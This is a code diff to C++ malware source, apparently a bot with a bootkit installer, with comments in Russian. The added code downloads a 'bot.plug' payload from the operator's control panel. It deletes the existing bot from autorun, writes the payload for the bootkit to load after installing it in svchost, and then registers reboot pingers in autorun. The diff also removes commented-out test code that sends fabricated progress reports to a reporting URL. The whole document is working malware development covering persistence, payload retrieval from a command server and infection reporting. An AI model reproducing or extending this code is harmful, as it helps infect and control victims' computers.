@@ -40,6 +40,8 @@
 #include "BotDebug.h"
 #include "DbgRptBootkit.h"
 #include "DbgRpt.h"
+#include "BootkitCrypt.h"
+#include "Plugins.h"
 
 namespace BootkitDll
 {
@@ -373,6 +375,50 @@ DWORD WINAPI SetupBootkitInSvchost(LPVOID)
 	return 0;
 }
 
+//скачиваем bot.plug с админки
+static BYTE* GetBotPlug( DWORD& size )
+{
+	BYTE* botPlug = Plugin::DownloadEx( "bot.plug", NULL, &size, true, false, NULL );
+	return botPlug;
+}
+
+//сохраняет бот в папке Documents and Settings\username\Application Data
+static bool SavedBot()
+{
+	PP_DPRINTF( "SavedBot: start" );
+	//сначала пытаемся перенести бота из автозагрузки
+	char* path = BOT::GetBotFullExeName();
+	bool res = false;
+	DWORD sizeBot = 0;
+	BYTE* dataBot = 0;
+	if( File::IsExists(path) ) //в автозагрузке есть бот, загружаем
+	{
+		PP_DPRINTF( "SavedBot: переносим бот из автозагрузки" );
+		dataBot = 0;//File::ReadToBufferA( path, sizeBot );
+		//удаляем
+		pSetFileAttributesA( path, FILE_ATTRIBUTE_NORMAL ); //убираем атрибут для чтения
+		if( pDeleteFileA(path) == 0 ) //если не удалился, то делаем чтобы после ребута удалился
+		{
+			pMoveFileExA( path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT );
+		}
+	}
+	STR::Free(path);
+	if( !dataBot ) //из автозагрузки не удалось перенести, качаем с админки бот плаг
+	{
+		PP_DPRINTF( "SavedBot: ставим bot.plug" );
+		dataBot = GetBotPlug(sizeBot);
+	}
+	if( dataBot )
+	{
+		if( WriteBotForBootkit( dataBot, sizeBot ) )
+		{
+			res = true;
+		}
+		MemFree(dataBot);
+	}
+	return res;
+}
+
 // Ф-ция, которая после проверок вызывает события старта в процессе Explorer,
 // что в свою очередь вызывает установку BkDll
 BOOL ExplorerMain()
@@ -381,7 +427,6 @@ BOOL ExplorerMain()
 	bool BkInstalledSuccess = false;
 	PP_DPRINTF("ExplorerMain: started");
 
-	// Вызываем событие старта експлорера
 	if ( (DWORD)pGetFileAttributesA(PathBkFile) == INVALID_FILE_ATTRIBUTES)
 	{
 		PP_DPRINTF("ExplorerMain: BkFile not exists. Runing ExplorerStart()");
@@ -399,7 +444,8 @@ BOOL ExplorerMain()
 //		if ( SetupBootkit() )
 		if( MegaJump(SetupBootkitInSvchost) )
 		{
-			pSleep(5000);
+			SavedBot();
+			pSleep(10000);
 			PP_DPRINTF("ExplorerStart: add pinger to autorun...");
 			AddRebootPingToAutorun();
 			AddRebootPingDllToAutorun();
@@ -446,6 +492,10 @@ BOOL ExplorerMain()
 
 	if (BkInstalledSuccess)
 	{
+		//ставим на удаление из автозагрузки уже установленного бота (возможно на машине работает бот, его нужно удалить)
+		//char* fileBot = BOT::GetBotFullExeName();
+		//pMoveFileExA( fileBot, 0, MOVEFILE_DELAY_UNTIL_REBOOT );
+		//STR::Free(fileBot);
 		DWORD thid = 0;
 		PP_DPRINTF("ExplorerMain: starting reboot thread and reboot notify thread");
 		pCreateThread(NULL, 0, RebootThread, NULL, 0, &thid);
@@ -782,295 +832,6 @@ void SvcFuckupServiceMainTest()
 	PP_DPRINTF("SvcFuckupServiceMainTest: finished");
 }
 
-
-//void TestStepNotifications()
-//{
-//	PP_DBGRPT_FUNCTION_CALL(DebugReportStep1());
-//	PP_DBGRPT_FUNCTION_CALL(DebugReportStep2(0));
-//	PP_DBGRPT_FUNCTION_CALL(DebugReportStep2(0xC001782));
-//	PP_DBGRPT_FUNCTION_CALL(DebugReportStep3());
-//	
-//	PP_DBGRPT_FUNCTION_CALL(DebugReportStep5());
-//	PP_DBGRPT_FUNCTION_CALL(DebugReportStep6());
-//}
-
-//void User32SprintfA(char* buffer, const char* format, ...)
-//{
-//  va_list ptr;
-//  va_start(ptr, format);
-//  pwvsprintfA(buffer, format, ptr);
-//  va_end(ptr);
-//}
-//
-//
-//void GenUid(char* Buffer, DWORD BufferSize, const char* Prefix)
-//{
-//	GUID g;
-//	CoCreateGuid(&g);
-//
-//	m_memset(Buffer, 0, BufferSize);
-//
-//	User32SprintfA(Buffer, "%s0%08X%04X%04X%02X%02X%02X%02X%02X%02X%02X%02X",
-//		Prefix, 
-//		g.Data1, 
-//		g.Data2, 
-//		g.Data3,
-//		g.Data4[0], 
-//		g.Data4[1], 
-//		g.Data4[2], 
-//		g.Data4[3], 
-//		g.Data4[4], 
-//		g.Data4[5], 
-//		g.Data4[6], 
-//		g.Data4[7]);
-//}
-
-//void TestDebugReportStep1(const char* uid, const char* os, const char* cs01)
-//{
-//	PStrings Fields = Strings::Create();
-//	AddURLParam(Fields, "cmd", "beforerbt");
-//	AddURLParam(Fields, "uid", (PCHAR)uid);
-//	AddURLParam(Fields, "os", (PCHAR)os);
-//
-//	if (cs01 != NULL)
-//	{
-//		AddURLParam(Fields, "cs01", (PCHAR)cs01);
-//	}
-//
-//	PCHAR Params = Strings::GetText(Fields, "&");
-//	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
-//
-//	PP_DPRINTF("DebugReportStep1: sending url='%s'", URL);
-//
-//	HTTP::Get(URL, NULL, NULL);
-//
-//	STR::Free(URL);
-//	STR::Free(Params);
-//	Strings::Free(Fields);
-//}
-//
-
-//void TestDebugReportStepByName(const char* Uid, const char* StepName)
-//{
-//	PStrings Fields = Strings::Create();
-//	AddURLParam(Fields, "cmd", "step");
-//	AddURLParam(Fields, "uid", (PCHAR)Uid);
-//	AddURLParam(Fields, "step", (PCHAR)StepName);
-//
-//	PCHAR Params = Strings::GetText(Fields, "&");
-//	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
-//	
-//	PP_DPRINTF("TestDebugReportStepByName: sending url='%s'", URL);
-//
-//	HTTP::Get(URL, NULL, NULL);
-//
-//	STR::Free(URL);
-//	STR::Free(Params);
-//	Strings::Free(Fields);
-//}
-
-//void TestNewReport()
-//{
-//	struct 
-//	{
-//		const char* cs01;
-//
-//		DWORD count_cs1;
-//
-//		DWORD count_111_d;
-//		DWORD count_122_d;
-//		DWORD count_160_dp;
-//		DWORD count_305_ld;
-//
-//	} cs_table[] = 
-//	{
-//		{"AAAAAFFFFF0000000000000000000011", 70, 70, 60, 50, 40},
-//		{"AAAAAFFFFF0000000000000000000022", 65, 65, 55, 45, 35},
-//		{"AAAAAFFFFF0000000000000000000033", 60, 60, 50, 40, 30},
-//		{"AAAAAFFFFF0000000000000000000044", 55, 55, 45, 35, 25},
-//		{"AAAAAFFFFF0000000000000000000055", 50, 50, 40, 30, 20},
-//	};
-//
-//	for (size_t i = 0; i < ARRAYSIZE(cs_table); i++)
-//	{
-//		for (size_t j = 0; j < cs_table[i].count_cs1; j++)
-//		{
-//			char uid[100] = {0};
-//			GenUid(uid, 100, "trtrtrtr");
-//
-//			TestDebugReportStep1(uid, "XP_3_32", cs_table[i].cs01);
-//
-//			if (cs_table[i].count_111_d > 0) 
-//			{
-//				TestDebugReportStepByName(uid, "111_d");
-//				cs_table[i].count_111_d--;
-//			}
-//
-//			if (cs_table[i].count_122_d > 0) 
-//			{
-//				TestDebugReportStepByName(uid, "122_d");
-//				cs_table[i].count_122_d--;
-//			}
-//
-//			if (cs_table[i].count_160_dp > 0) 
-//			{
-//				TestDebugReportStepByName(uid, "160_dp");
-//				cs_table[i].count_160_dp--;
-//			}
-//
-//			if (cs_table[i].count_305_ld > 0) 
-//			{
-//				TestDebugReportStepByName(uid, "305_ld");
-//				cs_table[i].count_305_ld--;
-//			}
-//		}
-//	}
-//}
-
-
-//
-//void TestNewReport()
-//{
-//	char*  uids[100];
-//
-//	struct 
-//	{
-//		const char* step_name;
-//		DWORD count;
-//
-//	} steps[] = 
-//	{
-//		{"100_d", 50},
-//		{"120_d", 45},
-//		{"130_d", 40},
-//		{"140_d", 35},
-//		{"150_d", 30},
-//		{"201_dp", 25},
-//		{"301_ld", 20},
-//		{"302_ld", 20},
-//		{"303_ld", 15},
-//		{"401_pl", 10},
-//		{"402_pl", 10},
-//		{"403_pl", 10},
-//	};
-//
-//	for (size_t i = 0; i < ARRAYSIZE(uids); i++)
-//	{
-//		uids[i] = STR::Alloc(100);
-//		GenUid(uids[i], 100, "testuid");
-//	}
-//
-//	for (size_t i = 0; i < ARRAYSIZE(steps); i++)
-//	{
-//		const char* step = steps[i].step_name;
-//		DWORD count = steps[i].count;
-//
-//		for (size_t j=0;j < count; j++)
-//		{
-//			TestDebugReportStepByName(uids[j], step);
-//		}
-//	}
-//
-//
-//}
-//void TestWriteLineToFile(const CHAR* buffer, const CHAR* path)
-//{
-//	HANDLE f = CreateFileA(path, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0, NULL);
-//	if (f != INVALID_HANDLE_VALUE)
-//	{
-//		pSetFilePointer(f, 0, 0, FILE_END);
-//		DWORD length = (DWORD)plstrlenA(buffer);
-//		DWORD written = 0;
-//		pWriteFile(f, buffer, length, &written, NULL);
-//		pWriteFile(f, "\r\n", 2, &written, NULL);
-//		pCloseHandle(f);
-//	}
-//}
-//
-//void TestDieMachineReport()
-//{
-//	//DebugReportCreateConfigReportAndSend();
-//
-//	const char * root_dir = "E:\\tmp\\1\\";
-//	
-//	struct 
-//	{
-//		const char* step_name;
-//		DWORD count;
-//
-//	} steps[] = 
-//	{
-//		{"111_d",  50},
-//		{"112_d",  45},
-//		{"160_dp", 25},
-//		{"304_ld", 20},
-//	};
-//
-//	struct
-//	{
-//		char*  uid;
-//		BYTE   stepset[ARRAYSIZE(steps)];
-//	} uids[200];
-//
-//	for (size_t i = 0; i < 55; i++)
-//	{
-//		uids[i].uid = STR::Alloc(100);
-//		GenUid(uids[i].uid, 100, "allordie");
-//		m_memset(uids[i].stepset, 0, sizeof(uids[i].stepset));
-//
-//		char path[MAX_PATH];
-//		char* uid = uids[i].uid;
-//
-//		m_memset(path, 0, sizeof(path));
-//		m_lstrcat(path, root_dir);
-//		m_lstrcat(path, uid);
-//		m_lstrcat(path, ".txt");
-//
-//		File::WriteBufferA(path, uid, m_lstrlen(uid));
-//		DebugReportSendSysInfo(uid, path);
-//	}
-//
-//	for (size_t i = 0; i < ARRAYSIZE(steps); i++)
-//	{
-//		const char* step = steps[i].step_name;
-//		DWORD count = steps[i].count;
-//
-//		for (size_t j=0;j < count; j++)
-//		{
-//			uids[j].stepset[i] = 1;
-//			TestDebugReportStepByName(uids[j].uid, step);
-//		}
-//	}
-//
-//	for (size_t i = 0; i < 55; i++)
-//	{
-//		char line[500];
-//		User32SprintfA(line, "%s:%d:%d:%d:%d", 
-//			uids[i].uid, 
-//			uids[i].stepset[0],
-//			uids[i].stepset[1],
-//			uids[i].stepset[2],
-//			uids[i].stepset[3]
-//			);
-//
-//		TestWriteLineToFile(line, "e:\\tmp\\1\\_all_stat");
-//		if (uids[i].stepset[0] != 0 && 
-//			uids[i].stepset[1] != 0 && 
-//			uids[i].stepset[2] == 0 && 
-//			uids[i].stepset[3] == 0
-//			)
-//		{
-//			TestWriteLineToFile(uids[i].uid, "e:\\tmp\\1\\_1E_2E_3Ne_4NE");
-//		}
-//
-//		if (uids[i].stepset[0] != 0 &&
-//			uids[i].stepset[1] != 0 &&
-//			uids[i].stepset[2] == 0)
-//		{
-//			TestWriteLineToFile(uids[i].uid, "e:\\tmp\\1\\_1E_2E_3Ne");
-//		}
-//	}
-//}
 
 void WaitAndExitProcess(DWORD exit_code)
 {
